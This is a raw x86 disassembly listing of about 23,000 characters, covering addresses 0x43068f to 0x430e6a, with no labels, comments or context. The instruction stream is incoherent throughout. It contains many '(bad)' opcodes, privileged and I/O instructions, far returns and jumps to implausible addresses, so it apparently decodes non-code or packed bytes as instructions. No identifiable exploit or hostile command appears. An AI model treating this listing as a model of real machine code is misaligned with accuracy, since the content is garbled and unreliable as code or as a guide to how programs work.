  43068f:	call   0x8ace5be1
  430694:	fcom   DWORD PTR [ecx]
  430696:	retf   
  430697:	jb     0x4306fe
  430699:	add    ch,cl
  43069b:	dec    ebp
  43069c:	sub    ecx,DWORD PTR [edx+0x55f00b03]
  4306a2:	dec    ebp
  4306a3:	xor    ecx,DWORD PTR [ebx-0x34173bfd]
  4306a9:	jge    0x430679
  4306ab:	mov    BYTE PTR [edi+0xf723b3a],ch
  4306b1:	add    cl,dh
  4306b3:	dec    ebp
  4306b4:	dec    DWORD PTR [ebx-0x2c031b75]
  4306ba:	adc    BYTE PTR [ebp+0x1],0x8b
  4306be:	add    ah,bl
  4306c0:	jge    0x43064e
  4306c2:	push   0xffffff9b
  4306c4:	push   0x8b3032
  4306c9:	shl    BYTE PTR [ebp+0x55],0x6a
  4306cd:	xor    edi,edi
  4306cf:	xor    edx,DWORD PTR [ebx+eax*1]
  4306d2:	inc    ebp
  4306d3:	add    eax,DWORD PTR [ebp-0x7c358bf1]
  4306d9:	dec    ebp
  4306da:	or     BYTE PTR [ecx+0x4dcce883],cl
  4306e0:	jbe    0x43066d
  4306e2:	mov    esp,eax
  4306e4:	ror    bl,1
  4306e6:	enter  0x14ce,0xaf
  4306ea:	dec    DWORD PTR [ebx-0x2cef13f8]
  4306f0:	push   ebp
  4306f1:	retf   0x5540
  4306f4:	push   ebp
  4306f5:	mov    esi,DWORD PTR [edx-0x18]
  4306f8:	mov    edx,ebx
  4306fa:	cld    
  4306fb:	(bad)  
  4306fc:	sub    BYTE PTR [edi-0x1bff74ff],0x0
  430703:	sti    
  430704:	add    dh,cl
  430706:	push   0xffffff94
  430708:	call   FWORD PTR [ebx+0x3b5032d0]
  43070e:	mov    ecx,DWORD PTR [edi]
  430710:	enter  0x455e,0xff
  430714:	mov    DWORD PTR [ebx+0x5545eccc],ecx
  43071a:	xor    esi,DWORD PTR [ebx]
  43071c:	mov    DWORD PTR [ebx],0xcace0f9c
  430722:	aas    
  430723:	push   ebp
  430724:	inc    ebp
  430725:	xor    edx,esi
  430727:	add    edx,esi
  430729:	mov    eax,DWORD PTR [ebx]
  43072b:	(bad)  
  43072c:	jmp    0x4306ba
  43072e:	mov    bl,BYTE PTR [ebx-0x7674cdfb]
  430734:	rol    ah,1
  430736:	mov    esi,0xf133104d
  43073b:	mov    edx,0xff388d80
  430740:	mov    dh,0xd1
  430742:	cmp    edx,DWORD PTR [ebp+0xf]
  430745:	mov    eax,DWORD PTR [edx-0x28]
  430748:	add    BYTE PTR [ebp-0x75],bh
  43074b:	xor    edi,DWORD PTR [ebx+eax*1-0x307bf035]
  430752:	fwait
  430753:	retf   0x8632
  430756:	cmp    ebp,0x8
  430759:	call   ebx
  43075b:	inc    ebp
  43075c:	inc    ebp
  43075d:	mov    ecx,DWORD PTR [ebx+0x450008d8]
  430763:	mov    esi,DWORD PTR [ecx]
  430765:	int3   
  430766:	pushf  
  430767:	add    al,0xc7
  430769:	add    al,al
  43076b:	add    bl,al
  43076d:	(bad)  
  43076e:	clc    
  43076f:	int3   
  430770:	inc    ebp
  430771:	add    BYTE PTR [ecx],dh
  430773:	push   eax
  430774:	pushf  
  430775:	mov    edi,eax
  430777:	enter  0xc008,0x85
  43077b:	aas    
  43077c:	clc    
  43077d:	gs inc ebp
  43077f:	add    BYTE PTR [ebx+0x4d00fc7d],cl
  430785:	push   ss
  430786:	xor    ecx,DWORD PTR [ebp+0x3]
  430789:	sub    edx,DWORD PTR [ecx-0x76]
  43078c:	dec    ebp
  43078d:	add    DWORD PTR [ebx+0x88d845],ecx
  430793:	mov    esi,DWORD PTR [ebx]
  430795:	or     BYTE PTR [ebx],al
  430797:	cmp    edx,DWORD PTR [ecx-0x34]
  43079a:	dec    ebp
  43079b:	out    dx,eax
  43079c:	xor    eax,DWORD PTR [ebp+0x3]
  43079f:	mov    edx,DWORD PTR [ecx-0x28]
  4307a2:	dec    ebp
  4307a3:	add    BYTE PTR [ebx],dh
  4307a5:	push   0x518003
  4307aa:	push   eax
  4307ab:	add    BYTE PTR [ebx-0x300748b],cl
  4307b1:	sbb    BYTE PTR [ebp+0x45],cl
  4307b4:	mov    ecx,DWORD PTR [ecx+0x7d00d0d8]
  4307ba:	xor    ecx,DWORD PTR [ebx-0x3cae0bfd]
  4307c0:	dec    ebp
  4307c1:	inc    ebp
  4307c2:	xor    edx,esi
  4307c4:	add    edx,esi
  4307c6:	push   ecx
  4307c7:	(bad)  
  4307c8:	dec    ebp
  4307c9:	mov    al,ds:0xc5d83dff
  4307ce:	retf   
  4307cf:	(bad)  
  4307d0:	into   
  4307d1:	sub    bh,bh
  4307d3:	dec    esp
  4307d4:	adc    al,0x9c
  4307d6:	inc    ebp
  4307d7:	push   ebp
  4307d8:	test   DWORD PTR [edi],ecx
  4307da:	unpcklps xmm0,XMMWORD PTR [ecx-0x7ab9ff80]
  4307e1:	jmp    0xc9bc16f5
  4307e6:	add    cl,dl
  4307e8:	mov    DWORD PTR [ebp+0x8501c0],0x33454df8
  4307f2:	xor    ecx,DWORD PTR [ebp+0x728b089c]
  4307f8:	rol    BYTE PTR [eax],0x54
  4307fb:	clc    
  4307fc:	gs jb  0x430806
  4307ff:	mov    eax,DWORD PTR [ebp-0x30]
  430802:	xor    al,0x40
  430804:	sub    al,0xc7
  430806:	mov    al,ah
  430808:	add    DWORD PTR [ebp+0x4534f845],eax
  43080e:	sub    al,0x80
  430810:	mov    BYTE PTR [edx+eax*1-0x375a39],bl
  430817:	mov    ch,0xff
  430819:	clc    
  43081a:	add    DWORD PTR [ebp+0x60],0x3d
  43081e:	call   FWORD PTR [eax+eax*1-0x277a77]
  430825:	inc    ebp
  430826:	dec    DWORD PTR [ebx-0x3427f701]
  43082c:	test   esi,ecx
  43082e:	dec    DWORD PTR [ebx-0x7f8a3701]
  430834:	push   eax
  430835:	add    DWORD PTR [ebp+0x0],eax
  430838:	dec    ebx
  43083a:	or     al,0xce
  43083c:	ror    BYTE PTR [ebx-0x34173fb0],0x4
  430843:	into   
  430844:	add    BYTE PTR [ebx-0x34ff2000],cl
  43084a:	mov    esi,ecx
  43084c:	sar    bh,0x45
  43084f:	adc    al,0x8b
  430851:	clc    
  430852:	fadd   DWORD PTR [ebp+0x0]
  430855:	mov    ebp,DWORD PTR [edx+0x8]
  430858:	push   edi
  430859:	adc    BYTE PTR [eax+0x1],0x83
  43085d:	add    al,al
  43085f:	retf   
  430860:	mov    ecx,esi
  430862:	cld    
  430863:	mov    eax,DWORD PTR [eax+0xcb01c8]
  430869:	into   
  43086a:	add    BYTE PTR [ebx+0x756ae000],cl
  430870:	jne    0x4308a5
  430872:	inc    DWORD PTR [ebx]
  430874:	rcl    BYTE PTR [ecx+0x50],1
  430877:	push   eax
  430878:	mov    ecx,DWORD PTR [ecx-0xbaf7f8]
  43087e:	mov    eax,DWORD PTR [eax+ebx*8-0x14ffbafd]
  430885:	sar    bh,0x84
  430888:	or     BYTE PTR [ebx],al
  43088a:	push   eax
  43088b:	add    BYTE PTR [ebx+0x453ccc45],cl
  430891:	pushf  
  430892:	xor    edi,eax
  430894:	pushf  
  430895:	mov    ah,0x89
  430897:	test   esp,ebp
  430899:	clc    
  43089a:	inc    ebp
  43089b:	inc    ebp
  43089c:	mov    DWORD PTR [eax+eax*8],esi
  43089f:	sub    al,0x32
  4308a1:	mov    BYTE PTR [ebx+ecx*4+0x54dce089],bl
  4308a8:	dec    ebp
  4308a9:	xor    eax,DWORD PTR gs:[edi+0x3]
  4308ad:	mov    ecx,DWORD PTR [ecx+0x4d54f4b4]
  4308b3:	xor    eax,DWORD PTR gs:[edi+0x3]
  4308b7:	or     DWORD PTR [ecx+0x45ff085c],0x0
  4308be:	shl    DWORD PTR [ebp-0x380064],1
  4308c4:	enter  0x858d,0x60
  4308c8:	clc    
  4308c9:	inc    DWORD PTR [ebp+0x50]
  4308cc:	cmp    al,0x75
  4308ce:	pushf  
  4308cf:	(bad)  
  4308d0:	(bad)  
  4308d1:	pop    esp
  4308d2:	lods   al,BYTE PTR ds:[esi]
  4308d3:	inc    DWORD PTR [ebp+0x4508f8ff]
  4308d9:	mov    edi,DWORD PTR [esi]
  4308db:	rcr    BYTE PTR [eax+esi*2+0x10b883c7],1
  4308e2:	test   DWORD PTR [edi-0x8],edx
  4308e5:	sbb    al,0x45
  4308e7:	add    BYTE PTR [eax],bh
  4308e9:	push   0x8b809c
  4308ee:	loopne 0x430935
  4308f0:	push   ebp
  4308f1:	mov    esi,DWORD PTR [ebx]
  4308f3:	cld    
  4308f4:	add    eax,DWORD PTR [eax+0xf013b]
  4308fa:	adc    al,0x0
  4308fc:	add    bh,bh
  4308fe:	jmp    0xc00a1b
  430903:	add    BYTE PTR [ebp+0x45],cl
  430906:	mov    ecx,DWORD PTR [ebx+0xd1d8ec]
  43090c:	dec    ebp
  43090d:	push   0x38033
  430912:	cmp    eax,DWORD PTR [eax]
  430914:	unpcklps xmm7,xmm0
  430917:	jne    0x430919
  430919:	dec    DWORD PTR [ebx+0x5545c818]
  43091f:	mov    DWORD PTR [ebx],esi
  430921:	shl    BYTE PTR [ebx],1
  430923:	inc    ebp
  430924:	add    ecx,DWORD PTR [ecx+0x60fcc03]
  43092a:	retf   0x5575
  43092d:	dec    DWORD PTR [ebx-0x5ba13e8]
  430933:	(bad)  
  430934:	stc    
  430935:	loopne 0x430943
  430937:	test   DWORD PTR [ebp-0x8],ecx
  43093a:	xor    eax,DWORD PTR [ebp+0x3]
  43093d:	mov    ebp,ecx
  43093f:	rol    BYTE PTR [eax],1
  430941:	inc    ebp
  430942:	add    BYTE PTR [eax-0x7747ab3],bh
  430948:	clc    
  430949:	inc    ebp
  43094a:	retf   
  43094b:	mov    edx,ebx
  43094d:	loopne 0x430925
  43094f:	retf   
  430950:	into   
  430951:	into   
  430952:	scas   eax,DWORD PTR es:[edi]
  430953:	dec    ebp
  430954:	mov    ecx,DWORD PTR [ebx-0x34821f0c]
  43095a:	sub    ecx,esi
  43095c:	cmp    ecx,DWORD PTR [ebp+0x77]
  43095f:	(bad)  
  430960:	mov    edi,eax
  430962:	enter  0x8985,0xf8
  430966:	add    BYTE PTR [ebp-0x75],al
  430969:	xor    ebp,DWORD PTR [esp+ebx*4-0x57cc38ab]
  430970:	xor    eax,DWORD PTR [ebp+0x4503f803]
  430976:	(bad)  
  430978:	retf   0x559c
  43097b:	(bad)  
  43097c:	mov    esp,DWORD PTR [esp+ebp*8-0x607057b]
  430983:	inc    ebp
  430984:	add    eax,0xeb9c4d3f
  430989:	(bad)  
  43098a:	mov    esi,DWORD PTR [eax-0x7aa7a5c]
  430990:	xor    ecx,DWORD PTR [ebp+0x33]
  430993:	mov    eax,DWORD PTR [ebx]
  430995:	in     al,dx
  430996:	add    ecx,ebx
  430998:	bswap  esi
  43099a:	retf   0x55d1
  43099d:	test   BYTE PTR [ebx-0x5ff13fe],cl
  4309a3:	jmp    0x43099e
  4309a5:	add    BYTE PTR ds:0xebf44d8b,al
  4309ab:	push   ebp
  4309ac:	mov    ebp,DWORD PTR [ebx]
  4309ae:	mov    eax,0x33f8558b
  4309b3:	retf   
  4309b4:	xor    ecx,esi
  4309b6:	add    edx,ecx
  4309b8:	add    eax,DWORD PTR [edx+0xca010f]
  4309be:	push   ebp
  4309bf:	dec    ebp
  4309c0:	mov    ecx,DWORD PTR [ebx-0x34050714]
  4309c6:	stc    
  4309c7:	rol    DWORD PTR ds:0xebce4dd6,cl
  4309cd:	scas   eax,DWORD PTR es:[edi]
  4309ce:	mov    ecx,DWORD PTR [ebx+0x7d55f4b0]
  4309d4:	xor    ebp,DWORD PTR [ebx]
  4309d6:	xor    edi,DWORD PTR [ebx]
  4309d8:	add    esi,DWORD PTR [edi+0x3]
  4309db:	mov    ecx,DWORD PTR [edi]
  4309dd:	clc    
  4309de:	retf   0x55cb
  4309e1:	into   
  4309e2:	mov    edi,DWORD PTR [esp+ebp*8-0x6740600]
  4309e9:	test   al,0x4d
  4309eb:	push   ebp
  4309ec:	jbe    0x430a21
  4309ee:	mov    esi,DWORD PTR [ebx]
  4309f0:	mov    al,0x3
  4309f2:	push   ebp
  4309f3:	add    esi,DWORD PTR [ebx]
  4309f5:	rdpmc  
  4309f7:	retf   0x5503
  4309fa:	add    ecx,DWORD PTR [ebx-0x53513f1]
  430a00:	dec    ebp
  430a01:	stc    
  430a02:	mov    ecx,DWORD PTR [eax]
  430a04:	or     BYTE PTR [ebp+0x4d],cl
  430a07:	jmp    0x1370a97
  430a0c:	dec    ebp
  430a0d:	dec    ebp
  430a0e:	(bad)  
  430a0f:	mov    esp,esp
  430a11:	clc    
  430a12:	test   ebx,ecx
  430a14:	clc    
  430a15:	ror    DWORD PTR [ebp-0x2a],cl
  430a18:	mov    esi,ecx
  430a1a:	lock scas eax,DWORD PTR es:[edi]
  430a1c:	inc    ebp
  430a1d:	mov    esi,DWORD PTR [ebx]
  430a1f:	hlt    
  430a20:	pushf  
  430a21:	jge    0x4309ae
  430a23:	sub    esp,esp
  430a25:	cmp    ecx,ebx
  430a27:	ja     0x4309f7
  430a29:	mov    ebp,DWORD PTR [eax-0x58]
  430a2c:	dec    ebp
  430a2d:	xor    ecx,DWORD PTR [di+0x3]
  430a31:	mov    ebp,eax
  430a33:	clc    
  430a34:	push   ebp
  430a35:	retf   
  430a36:	mov    dl,bl
  430a38:	adc    esi,edx
  430a3a:	jb     0x430a0a
  430a3c:	add    BYTE PTR [edi-0xb7474b3],ch
  430a42:	lock jge 0x430a10
  430a45:	sub    ecx,DWORD PTR [ebp+0x3b]
  430a48:	mov    esi,DWORD PTR [edi-0x28]
  430a4b:	mov    ecx,DWORD PTR [esp+ebp*4+0x4d32459b]
  430a52:	mov    BYTE PTR [ebx-0x34b20729],cl
  430a58:	mov    edx,ebx
  430a5a:	lock (bad) 
  430a5c:	ror    esi,cl
  430a5e:	push   ebp
  430a5f:	scas   eax,DWORD PTR es:[edi]
  430a60:	mov    ecx,DWORD PTR [ebx+0x7d8cf4d8]
  430a66:	fwait
  430a67:	sub    esi,DWORD PTR [edx]
  430a69:	cmp    ecx,DWORD PTR [edx+0x558bd777]
  430a6f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  430a70:	xor    esp,DWORD PTR [ebx]
  430a72:	add    ecx,DWORD PTR [ebp-0x18]
  430a75:	mov    edi,DWORD PTR [ebp-0x8]
  430a78:	mov    bl,cl
  430a7a:	cmp    dl,bl
  430a7c:	jb     0x430a4c
  430a7e:	add    dh,dl
  430a80:	dec    ebp
  430a81:	scas   eax,DWORD PTR es:[edi]
  430a82:	mov    ecx,DWORD PTR [ebx+0x7dcbf4f0]
  430a88:	shr    DWORD PTR [ebx],cl
  430a8a:	into   
  430a8b:	cmp    edx,esi
  430a8d:	mov    ebp,DWORD PTR [edi-0x17fcfc48]
  430a93:	dec    ebp
  430a94:	dec    ebp
  430a95:	mov    ecx,DWORD PTR [ebx+0x55d3f0f8]
  430a9b:	retf   
  430a9c:	xor    edx,esi
  430a9e:	add    ecx,esi
  430aa0:	imul   ecx,edx
  430aa3:	mov    DWORD PTR [ebp+0x8],edx
  430aa6:	xor    ecx,DWORD PTR [ebp+0x2b]
  430aa9:	mov    DWORD PTR [ebx+0x7d4df0e0],ecx
  430aaf:	add    esi,DWORD PTR [ebx]
  430ab1:	rol    BYTE PTR [ebx],0x45
  430ab4:	rdtsc  
  430ab6:	xlat   BYTE PTR ds:[ebx]
  430ab7:	pushf  
  430ab8:	jge    0x430a43
  430aba:	xor    ebx,eax
  430abc:	sub    eax,DWORD PTR [ebp-0x73]
  430abf:	(bad)  
  430ac0:	cmp    dh,BYTE PTR [edx+esi*2-0x2e07ff7b]
  430ac7:	dec    ebp
  430ac8:	xchg   BYTE PTR [ebx],dh
  430aca:	inc    DWORD PTR [ebx]
  430acc:	(bad)  
  430acd:	jmp    0x430b1c
  430acf:	mov    ecx,DWORD PTR [ebx-0x34341f1c]
  430ad5:	dec    ebp
  430ad6:	into   
  430ad7:	mov    ebp,DWORD PTR [edi-0x1b737428]
  430add:	fwait
  430ade:	shl    DWORD PTR [edx],cl
  430ae0:	retf   0x5588
  430ae3:	or     ecx,DWORD PTR [ebp+0x7233114d]
  430ae9:	add    eax,DWORD PTR [eax]
  430aeb:	call   0x8ace603d
  430af0:	fcom   QWORD PTR [ecx]
  430af2:	retf   
  430af3:	jb     0x430b5a
  430af5:	add    ch,cl
  430af7:	dec    ebp
  430af8:	sub    ecx,DWORD PTR [edx+0x55ec0b03]
  430afe:	dec    ebp
  430aff:	xor    ecx,DWORD PTR [ebx-0x34170bfd]
  430b05:	jge    0x430ad5
  430b07:	mov    BYTE PTR [edi+0xf723b3a],ch
  430b0d:	add    cl,dh
  430b0f:	dec    ebp
  430b10:	dec    DWORD PTR [ebx-0x2c031b01]
  430b16:	inc    ebp
  430b17:	push   ebp
  430b18:	dec    DWORD PTR [ebx-0x73ff2734]
  430b1e:	lea    ebx,[ebx-0x7400cdac]
  430b24:	push   eax
  430b25:	mov    ah,0x45
  430b27:	push   ebp
  430b28:	mov    esi,DWORD PTR [ebx]
  430b2a:	les    esi,FWORD PTR [ebx]
  430b2c:	add    BYTE PTR [ebx],al
  430b2e:	inc    DWORD PTR [ebx]
  430b30:	mov    ecx,DWORD PTR [edi]
  430b32:	cld    
  430b33:	retf   0x4d80
  430b36:	add    DWORD PTR [ecx+0x4d30e800],ecx
  430b3c:	jne    0x430ac9
  430b3e:	jmp    eax
  430b40:	ror    bl,1
  430b42:	or     cl,dh
  430b44:	add    BYTE PTR [edi-0xf2f7475],ch
  430b4a:	not    bl
  430b4c:	adc    al,0xca
  430b4e:	inc    ebp
  430b4f:	push   ebp
  430b50:	mov    ecx,DWORD PTR [ebx-0x2cff1728]
  430b56:	push   0xaf80d6
  430b5b:	mov    eax,DWORD PTR [eax]
  430b5d:	in     al,0xff
  430b5f:	sti    
  430b60:	sbb    dh,cl
  430b62:	pop    esi
  430b63:	xchg   esp,eax
  430b64:	leave  
  430b65:	fwait
  430b66:	add    al,0x32
  430b68:	push   ebp
  430b69:	cmp    ebp,esp
  430b6b:	sqrtps xmm3,XMMWORD PTR [esi+0x4d]
  430b6f:	dec    DWORD PTR [ecx-0x740f0375]
  430b75:	push   ebp
  430b76:	cld    
  430b77:	xor    ebp,ebx
  430b79:	add    ecx,DWORD PTR [ebx-0x743576f1]
  430b7f:	push   ebp
  430b80:	clc    
  430b81:	xor    esi,ecx
  430b83:	add    esi,DWORD PTR [ebp-0x75]
  430b86:	(bad)  
  430b87:	hlt    
  430b88:	or     DWORD PTR [esi+eax*8-0x39cdf865],ecx
  430b8f:	mov    DWORD PTR [esi],eax
  430b91:	hlt    
  430b92:	(bad)  
  430b93:	dec    ebp
  430b94:	add    esi,DWORD PTR [ebx]
  430b96:	(bad)  
  430b97:	mov    edx,0xffc68d0a
  430b9c:	add    dl,cl
  430b9e:	leave  
  430b9f:	push   ebp
  430ba0:	push   ebp
  430ba1:	mov    ebp,esp
  430ba3:	fcom   QWORD PTR [ecx+0x7d]
  430ba6:	inc    ebp
  430ba7:	xor    ecx,DWORD PTR [ecx-0x74f003fd]
  430bad:	iret   
  430bae:	cld    
  430baf:	retf   0x868f
  430bb2:	loopne 0x430bb1
  430bb4:	mov    edi,edi
  430bb6:	mov    esi,DWORD PTR [ebp-0x8]
  430bb9:	mov    esi,eax
  430bbb:	cld    
  430bbc:	jne    0x430b6e
  430bbe:	mov    BYTE PTR [ecx],0xa
  430bc1:	add    dh,al
  430bc3:	test   DWORD PTR [eax],ecx
  430bc5:	inc    esi
  430bc7:	inc    DWORD PTR [edi]
  430bc9:	mov    eax,esi
  430bcb:	cld    
  430bcc:	add    DWORD PTR [eax+0x901c6],eax
  430bd2:	leave  
  430bd3:	xor    BYTE PTR [ebp+0x45],dl
  430bd6:	in     al,dx
  430bd7:	mov    edx,DWORD PTR [ecx-0x40]
  430bda:	inc    ebp
  430bdb:	add    BYTE PTR [ecx-0x74000301],cl
  430be1:	int3   
  430be2:	cld    
  430be3:	jne    0x430b9d
  430be5:	call   0xcc1ef0
  430bea:	mov    esi,DWORD PTR [ebp-0x8]
  430bed:	test   eax,esi
  430bef:	je     0x430c66
  430bf1:	mov    eax,esi
  430bf3:	cld    
  430bf4:	add    al,0x80
  430bf6:	add    WORD PTR [ecx+0x0],ax
  430bfa:	fiadd  DWORD PTR [eax]
  430bfc:	mov    BYTE PTR [eax],0x3d
  430bff:	push   0xffffffc3
  430c01:	push   esi
  430c02:	mov    edx,DWORD PTR [eax+0x51]
  430c05:	pop    edi
  430c06:	lea    ebx,[ebx-0x8]
  430c09:	ret    0x45
  430c0c:	mov    ecx,DWORD PTR [ebx-0x7240ae04]
  430c12:	xchg   eax,edi
  430c14:	mov    DWORD PTR [ebp-0x75],ecx
  430c17:	push   esi
  430c18:	clc    
  430c19:	jne    0x430beb
  430c1b:	mov    ecx,0xf8450b0b
  430c20:	(bad)  
  430c21:	push   cs
  430c22:	or     BYTE PTR [ebp-0x3a],dh
  430c25:	cmp    eax,DWORD PTR [ecx]
  430c27:	pop    esi
  430c28:	(bad)  
  430c29:	or     al,0x5
  430c2b:	inc    eax
  430c2c:	leave  
  430c2d:	jmp    0x40cf:0x25564204
  430c34:	leave  
  430c35:	in     eax,dx
  430c36:	inc    DWORD PTR [eax-0x75]
  430c39:	fimul  DWORD PTR [ebx-0x228139be]
  430c3f:	inc    eax
  430c40:	nop
  430c41:	loopne 0x430c42
  430c43:	ret    
  430c44:	mov    ecx,DWORD PTR [ebx-0x7239ae75]
  430c4a:	add    eax,0xff45e8f8
  430c4f:	push   esi
  430c50:	push   DWORD PTR [ebp-0x39]
  430c53:	mov    eax,0x7edda46
  430c58:	or     al,0x6
  430c5a:	push   DWORD PTR [ebp-0x3a]
  430c5d:	cmp    eax,DWORD PTR [edx]
  430c5f:	pop    esi
  430c60:	ret    
  430c61:	or     al,0x56
  430c63:	inc    ecx
  430c64:	push   ebp
  430c65:	jle    0x430c53
  430c67:	inc    edx
  430c68:	inc    ebp
  430c69:	int    0x1
  430c6b:	inc    ecx
  430c6c:	sub    BYTE PTR ds:0xe77541fc,ah
  430c72:	add    DWORD PTR [edx+0x1c],eax
  430c75:	retf   0xc38b
  430c78:	adc    al,0x8b
  430c7a:	xchg   edx,eax
  430c7b:	push   ecx
  430c7c:	mov    cl,BYTE PTR [ebp+0x45c8f8fe]
  430c82:	rcl    DWORD PTR [esi-0x9],cl
  430c85:	jne    0x430cd7
  430c87:	mov    eax,0x7c80ece
  430c8c:	rol    DWORD PTR [esi],cl
  430c8e:	div    DWORD PTR [ebp+0x50]
  430c91:	cmp    ecx,edx
  430c93:	pop    esi
  430c94:	dec    BYTE PTR [edx]
  430c96:	in     al,dx
  430c97:	inc    edx
  430c98:	sub    esp,ecx
  430c9a:	inc    eax
  430c9b:	(bad)  
  430c9c:	push   eax
  430c9d:	add    edx,DWORD PTR [eax-0x1f]
  430ca0:	push   edi
  430ca1:	add    dh,dh
  430ca3:	leave  
  430ca4:	adc    DWORD PTR [ebp-0x1],0xffffffec
  430ca8:	add    BYTE PTR [ecx+0x0],dl
  430cab:	inc    ebp
  430cac:	ror    DWORD PTR [ecx+0x5536fc8d],cl
  430cb2:	add    BYTE PTR [eax-0x7fbf448],bh
  430cb8:	add    al,0x2
  430cba:	jmp    0x57eb814
  430cbf:	jne    0x430ca9
  430cc1:	mov    eax,DWORD PTR [edx]
  430cc3:	or     BYTE PTR [eax],al
  430cc5:	inc    ecx
  430cc6:	stc    
  430cc7:	in     eax,dx
  430cc8:	ss inc eax
  430cca:	aas    
  430ccb:	out    0x7d,eax
  430ccd:	inc    ecx
  430cce:	mov    ebp,ecx
  430cd0:	lock ret 0x7d
  430cd4:	and    ecx,DWORD PTR [ebx-0x171777]
  430cda:	add    bh,bh
  430cdc:	aad    0xd7
  430cde:	add    dh,cl
  430ce0:	clts   
  430ce2:	(bad)  
  430ce3:	call   0xffce0be8
  430ce8:	hlt    
  430ce9:	iret   
  430cea:	jge    0x430cc2
  430cec:	rol    DWORD PTR [esi-0x80],cl
  430cef:	jmp    0x1c5bfc
  430cf4:	out    dx,al
  430cf5:	mov    eax,DWORD PTR [ebx]
  430cf7:	(bad)  
  430cf8:	pop    esi
  430cf9:	push   es
  430cfa:	cmp    al,0xe8
  430cfc:	sar    edi,0x8
  430cff:	inc    DWORD PTR [edi]
  430d01:	inc    esi
  430d02:	(bad)  
  430d03:	loopne 0x430d83
  430d05:	push   edi
  430d06:	push   cs
  430d07:	push   ebx
  430d08:	add    BYTE PTR [ebx+0x24008b56],cl
  430d0e:	add    BYTE PTR [ebp+0x50],al
  430d11:	push   eax
  430d12:	add    DWORD PTR [ebx+0x757d1834],ecx
  430d18:	sub    edx,DWORD PTR [esi-0x24]
  430d1b:	jne    0x430cd3
  430d1d:	lods   eax,DWORD PTR ds:[esi]
  430d1e:	mov    edx,DWORD PTR [edx-0x34]
  430d21:	dec    esi
  430d22:	out    0x83,eax
  430d24:	into   
  430d25:	push   edi
  430d27:	loopne 0x430cf7
  430d29:	shr    BYTE PTR [edx+ecx*4+0x0],1
  430d2d:	and    DWORD PTR [edx-0x741fff01],0xffffffd0
  430d34:	rol    DWORD PTR [edx],0x8
  430d37:	mov    esp,ecx
  430d39:	cmp    DWORD PTR [ebx],0xc
  430d3c:	mov    esi,0x5001c0
  430d41:	push   eax
  430d42:	push   cs
  430d43:	push   eax
  430d44:	(bad)  
  430d45:	sub    edx,edi
  430d47:	push   esi
  430d48:	adc    al,0xcb
  430d4a:	ins    DWORD PTR es:[edi],dx
  430d4b:	mov    eax,0x203e8
  430d50:	add    al,ah
  430d52:	ror    BYTE PTR [eax+0xc007c0],0xc0
  430d59:	add    dh,al
  430d5b:	add    ah,ch
  430d5d:	rol    DWORD PTR [ebx-0x3595fb0d],1
  430d63:	pop    ecx
  430d64:	or     eax,ebx
  430d66:	cli    
  430d67:	add    BYTE PTR [ecx-0x4e728d1e],dh
  430d6d:	lea    ebp,[ebx]
  430d6f:	mov    edx,DWORD PTR [edx-0x4]
  430d72:	dec    ecx
  430d73:	inc    ebp
  430d74:	shr    BYTE PTR [ebx],0x4b
  430d77:	and    al,0x0
  430d79:	(bad)  
  430d7a:	jne    0x430dc1
  430d7c:	pop    eax
  430d7d:	mov    al,0x5a
  430d7f:	call   0x1420fde
  430d84:	and    al,0x85
  430d86:	push   edx
  430d87:	add    BYTE PTR [eax+eax*1+0x0],ah
  430d8b:	dec    ebp
  430d8c:	mov    cl,0x23
  430d8e:	jmp    0x430d7c
  430d90:	mov    al,0xe7
  430d92:	call   0x1391080
  430d97:	shr    DWORD PTR [eax+ebx*2],cl
  430d9a:	lock (bad) 
  430d9c:	adc    eax,0x757f008d
  430da1:	out    0x58,eax
  430da3:	cmp    al,0x7
  430da5:	pop    edx
  430da6:	or     DWORD PTR [edx+eax*1-0x74fff494],ecx
  430dad:	push   ecx
  430dae:	cld    
  430daf:	mov    esi,0x3b0175
  430db4:	and    al,0xb0
  430db6:	xor    BYTE PTR [edx+0x1],0x8b
  430dba:	add    ah,bh
  430dbc:	mov    edi,DWORD PTR [ebp-0x4]
  430dbf:	psubsw mm7,QWORD PTR [edi]
  430dc2:	add    DWORD PTR [ebp+0x0],ebp
  430dc5:	rcr    eax,1
  430dc7:	mov    edi,ecx
  430dc9:	and    eax,DWORD PTR [eax]
  430dcb:	add    ecx,DWORD PTR [ebx+0x1b4dd88d]
  430dd1:	call   0x13010ba
  430dd6:	add    al,cl
  430dd8:	mov    ebp,esi
  430dda:	aam    0x83
  430ddc:	or     DWORD PTR [ecx],eax
  430dde:	jne    0x430dd1
  430de0:	mov    eax,DWORD PTR [eax]
  430de2:	aam    0x0
  430de4:	dec    ebp
  430de5:	jne    0x430d72
  430de7:	cmp    ebx,eax
  430de9:	jb     0x430e38
  430deb:	jmp    0x430d78
  430ded:	mov    ebx,esp
  430def:	int3   
  430df0:	dec    ebp
  430df1:	or     DWORD PTR [ecx+0x5f8bdc00],0xffffff8b
  430df8:	mov    edx,0x8b0a8b
  430dfd:	cmp    ecx,DWORD PTR [eax]
  430dff:	jb     0x430dd8
  430e01:	pop    edx
  430e02:	push   edi
  430e03:	cli    
  430e04:	pop    es
  430e05:	mov    eax,ecx
  430e07:	jb     0x430e0b
  430e09:	add    DWORD PTR [ebx],0xa
  430e0c:	mov    eax,DWORD PTR [ebx]
  430e0e:	int3   
  430e0f:	add    bh,BYTE PTR [esi+0x75d10006]
  430e15:	jmp    0x430da2
  430e17:	mov    al,0xe8
  430e19:	call   0x104109b
  430e1e:	add    edx,DWORD PTR [ecx+ecx*8]
  430e21:	pop    edi
  430e22:	or     BYTE PTR [ecx-0x73],bl
  430e25:	pop    ecx
  430e26:	inc    edi
  430e27:	xor    al,0xeb
  430e29:	push   ecx
  430e2a:	mov    edi,DWORD PTR [edx+0xc506cc]
  430e30:	call   0xb20f35
  430e35:	int3   
  430e36:	sbb    BYTE PTR [esi],ch
  430e38:	inc    ebp
  430e39:	add    BYTE PTR [ebx-0x1f4f338b],cl
  430e3f:	call   0x9c10ae
  430e44:	or     BYTE PTR [ebx-0x73],dl
  430e47:	cmp    al,0x47
  430e49:	mov    al,0x1
  430e4b:	jb     0x430e4d
  430e4d:	mov    al,0x10
  430e4f:	push   eax
  430e50:	add    al,0x75
  430e52:	add    BYTE PTR [ebx],ch
  430e54:	add    ebx,esp
  430e56:	int3   
  430e57:	jne    0x430e69
  430e59:	movsx  edx,cl
  430e5c:	add    DWORD PTR [eax],eax
  430e5e:	add    BYTE PTR [ebp+ecx*2+0x40aa2b7d],ch
  430e65:	mov    gs,edi
  430e67:	add    BYTE PTR [eax-0x50],ch
  430e6a:	add    al,ch
